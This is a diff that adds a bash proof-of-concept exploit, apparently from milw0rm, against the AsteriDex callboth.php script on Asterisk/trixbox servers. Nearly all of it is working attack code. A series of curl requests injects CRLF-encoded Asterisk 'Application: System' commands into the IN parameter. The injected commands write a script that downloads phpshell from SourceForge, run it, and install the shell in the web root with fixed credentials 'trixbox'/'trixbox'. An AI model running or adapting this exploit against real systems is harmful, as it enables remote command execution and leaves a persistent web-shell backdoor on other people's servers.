@@ -1,0 +1,59 @@
+##
+## Begin exploit
+##
+#!/bin/bash
+
+echo Asteridex PoC Exploit (callboth.php vulnerability)
+echo By Carl Livitt / Hoku Security / June 2007
+echo
+
+# This has to be (a) a valid SIP address, and (b) must answer when dialled.
+# The exploit will fail without these conditions being met.
+# Currently uses the Melonite SIP echo test service.
+SIP="190@sip.melonite.nu"
+
+# Magic number, don't change. The default installation of AsteriDex checks
+# for this number and fails without it.
+SEQ=654321
+
+# Other stuff we need
+LOC=/asteridex/callboth.php
+OUT=123456
+
+# Sanity
+if [ "$1X" == "X" ]; then
+       echo Syntax: $0 \<Host IP\[:port\]\>
+       echo For example: $0 www.example.com:8080
+       exit 1
+fi
+
+# Insanity
+echo "[-] Exploiting host $1 - please wait"
+echo -n '[+]' Building shell script
+curl "http://$1/$LOC?SEQ=$SEQ&OUT=$OUT&IN=$SIP%0d%0aApplication:%20System%0d%0aData:%20echo%20\!/bin/sh>/tmp/t%0d%0a" &>/dev/null
+echo -n .
+curl "http://$1/$LOC?SEQ=$SEQ&OUT=$OUT&IN=$SIP%0d%0aApplication:%20System%0d%0aData:%20echo%20%2dn%20wget%20%2dO%20x.tar.bz2%20%5c%27http://%3e%3e/tmp/t%0d%0a" &>/dev/null
+echo -n .
+curl "http://$1/$LOC?SEQ=$SEQ&OUT=$OUT&IN=$SIP%0d%0aApplication:%20System%0d%0aData:%20echo%20%2dn%20prdownloads.sf.net/phpshell/%3e%3e/tmp/t%0d%0a" &>/dev/null
+echo .
+curl "http://$1/$LOC?SEQ=$SEQ&OUT=$OUT&IN=$SIP%0d%0aApplication:%20System%0d%0aData:%20echo%20phpshell%2d2.1.tar.bz2%3fdownload%5c%27%3e%3e/tmp/t%0d%0a" &>/dev/null
+echo '[+] Executing shell script'
+curl "http://$1/$LOC?SEQ=$SEQ&OUT=$OUT&IN=$SIP%0d%0aApplication:%20System%0d%0aData:%20cd%20/tmp;chmod%20%2bx%20t;./t;tar%20jxf%20x.tar.bz2%0d%0a" &>/dev/null
+echo -n '[+] Setting up phpshell'
+curl "http://$1/$LOC?SEQ=$SEQ&OUT=$OUT&IN=$SIP%0d%0aApplication:%20System%0d%0aData:%20cd%20cd%20/tmp;mv%20phpshell-2.1%20p%0d%0a" &>/dev/null
+echo -n .
+curl "http://$1/$LOC?SEQ=$SEQ&OUT=$OUT&IN=$SIP%0d%0aApplication:%20System%0d%0aData:%20cd%20/tmp/p;echo%20%5c%5busers%5c%5d>config.php%0d%0a" &>/dev/null
+echo -n .
+curl "http://$1/$LOC?SEQ=$SEQ&OUT=$OUT&IN=$SIP%0d%0aApplication:%20System%0d%0aData:%20cd%20/tmp/p;echo%20%27trixbox%3d%22trixbox%22%27>>config.php%0d%0a" &>/dev/null
+echo .
+curl "http://$1/$LOC?SEQ=$SEQ&OUT=$OUT&IN=$SIP%0d%0aApplication:%20System%0d%0aData:%20mv%20/tmp/p%20/var/www/html/phpshell%0d%0a" &>/dev/null
+
+# Have a nice day
+echo "Done! You should now be able to browse to http://$1/phpshell/phpshell.php"
+echo You can login with the username \'trixbox\' and password \'trixbox\'
+
+##
+## End Exploit
+##
+
+# milw0rm.com [2007-07-05]
